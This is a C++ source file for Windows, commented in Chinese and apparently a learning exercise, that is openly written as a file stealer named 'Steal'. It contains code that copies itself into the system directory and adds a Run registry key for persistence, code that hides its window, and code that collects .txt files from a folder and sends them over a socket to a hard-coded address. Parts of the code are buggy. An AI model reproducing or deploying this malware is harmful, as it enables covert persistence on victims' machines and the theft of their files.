#include<iostream>
#include<windows.h>
#include<cstdio>
#include<cstring>
#include<string>

#include<corecrt_io.h>

//#include<WinSock2.h>

#pragma comment(lib,"ws2_32.lib")
// typedef struct _WIN32_FIND_DATAW {              //文件结构体
// 	DWORD dwFileAttributes;                       属性
// 	FILETIME ftCreationTime;                      创建时间
// 	FILETIME ftLastAccessTime;                    最后一次进入时间
// 	FILETIME ftLastWriteTime;                     最后一次写入时间
// 	DWORD nFileSizeHigh;                          文件大小的高位
// 	DWORD nFileSizeLow;                           文件大小的低位
// 	DWORD dwReserved0;                            保留字段
// 	DWORD dwReserved1;                            保留字段
// 	_Field_z_ WCHAR  cFileName[MAX_PATH];         文件名
// 	_Field_z_ WCHAR  cAlternateFileName[14];      改变之后的文件名
// #ifdef _MAC
// 	DWORD dwFileType;
// 	DWORD dwCreatorType;
// 	WORD  wFinderFlags;
// #endif
// } WIN32_FIND_DATAW, * PWIN32_FIND_DATAW, * LPWIN32_FIND_DATAW;

void AddToSystem()    //加入到系统注册表
{
	HKEY  hKEY;
	char  CurrentPath[MAX_PATH];
	char  SysPath[MAX_PATH];
	long  ret = 0;
	LPSTR FileNewName;
	LPSTR FileCurrentName;
	DWORD type = REG_SZ;
	DWORD size = MAX_PATH;
	LPCTSTR Rgspath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";  //regedit  win + R

	GetSystemDirectory(SysPath, size);
	GetModuleFileName(NULL, CurrentPath, size);
	//Copy File
	FileCurrentName = CurrentPath;
	FileNewName = lstrcat(SysPath, "\\Steal.exe");
	struct _finddata_t Steal;
	printf("ret1 = %d,FileNewName = %s\n", ret, FileNewName);
	if (_findfirst(FileNewName, &Steal) != -1)
		return;//已经安装！
	printf("ret2 = %d\n", ret);

	int ihow = MessageBox(0, "该程序只允许用于合法的用途！\n继续运行该程序将使这台机器处于被监控的状态！\n如果您不想这样，请按“取消”按钮退出。\n按下“是”按钮该程序将被复制到您的机器上，并随系统启动自动运行。\n按下“否”按钮，程序只运行一次，不会在您的系统内留下任何东西。", "警告", MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ihow == IDCANCEL)
		exit(0);

	if (ihow == IDNO)
		return;//只运行一次
	//复制文件
	ret = CopyFile(FileCurrentName, FileNewName, TRUE);
	if (!ret)
	{
		return;
	}
	//加入注册表
	printf("ret = %d\n", ret);
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &hKEY);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	//Set Key
	ret = RegSetValueEx(hKEY, "Steal", NULL, type, (const unsigned char*)FileNewName, size);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	RegCloseKey(hKEY);

}
//影藏自身
void HideMyself()
{
	// 拿到当前的窗口句柄
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int SendToServer(const char* myPath)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1, -1);
	//初始化套接字库
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return err;
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	SOCKET sock = -1;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		std::cout << "socket error!" << std::endl;
		return -2;
	}

	SOCKADDR_IN peer;
	peer.sin_family = AF_INET;
	std::string address("192.168.2.2");
	peer.sin_addr.S_un.S_addr = inet_addr(address.c_str());
	peer.sin_port = htons(8888);

	if (connect(sock, (SOCKADDR*)&peer, sizeof(peer)) < 0)
	{
		std::cout << "connect fail !" << std::endl;
		return -3;
	}
	std::string sendMsg;

	//读取文件内容
	FILE* pf = fopen(myPath, "rb");
	if (pf == NULL)
	{
		std::cout << "fopen() fail!" << std::endl;
		return -1;
	}
	char ch = 0;
	while (TRUE)
	{
		size_t len = fread(&ch, sizeof(char), 1, pf);
		if (len > 0)
		{
			sendMsg += ch;
		}
		else
		{
			fclose(pf);
			break;
		}
	}

	if (send(sock, sendMsg.c_str(), sendMsg.size(), 0) < 0)
	{
		std::cerr << "send error!" << std::endl;
		return -4;
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}
int doSteelFile(const char* szPath)
{
	//1、遍历路径下的所有文件
	WIN32_FIND_DATA FindFileData;        //用该结构体来表示文件             ////windows遍历文件夹
	FindFileData.cFileName[MAX_PATH] = { 0 };
	FindFileData.dwFileAttributes = NULL;
	FindFileData.ftCreationTime = {};
	//FindFileData.cAlternateFileName = {};
	FindFileData.ftLastWriteTime = {};
	FindFileData.nFileSizeHigh = 0;
	FindFileData.nFileSizeLow = 0;
	HANDLE hListFile;             //文件用句柄来标识---编号

	//2、首先找到第一个文件
	// 	WINBASEAPI
	// 		HANDLE                               //返回值是一个文件操作句柄
	// 		WINAPI
	// 		FindFirstFileW(
	// 			_In_ LPCWSTR lpFileName,           //文件名  ---入参
	// 			_Out_ LPWIN32_FIND_DATAW lpFindFileData    文件结构体  ---出参
	// 		);

	//windows下文件路径名最大长度 MAX_PATH ==260
	char szFilePath[MAX_PATH] = { 0 };
	strcpy(szFilePath, szPath);
	//添加一个通配符 '\*'
	strcat(szFilePath, "\\*");
	hListFile=FindFirstFile(szFilePath, &FindFileData);     //该函数从找到第一文件开始，一直会找到该路径下的所有文件
	                                          //每次找到一个文件，就会将该文件的属性信息填入到FindFileData中

	std::string myFile;
	
	do
	{
		// 		WINBASEAPI
		// 			BOOL
		// 			WINAPI
		// 			FindNextFileW(             
		// 				_In_ HANDLE hFindFile,      
		// 				_Out_ LPWIN32_FIND_DATAW lpFindFileData  //输出找到的所有句柄
		// 			);

		//处理被找到的文件
		myFile.clear();
		myFile += szPath;
		myFile += FindFileData.cFileName;
		std::cout << "myFile: " << myFile << std::endl;

		//查找所有的 “.txt”文件
		if (strstr(myFile.c_str(), ".txt") == nullptr)
		{
			continue;
		}
		SendToServer(myFile.c_str());

	} while (FindNextFile(hListFile, &FindFileData));         //FindNextFile()如果能找到下一个文件则返回TRUE,否则返回FALSE	

	return 0;
}


int main()
{
	std::cout << "Steel..." << std::endl;
	doSteelFile("F:\\TmpForSteelFile\\");

	system("pause");
	return 0;
}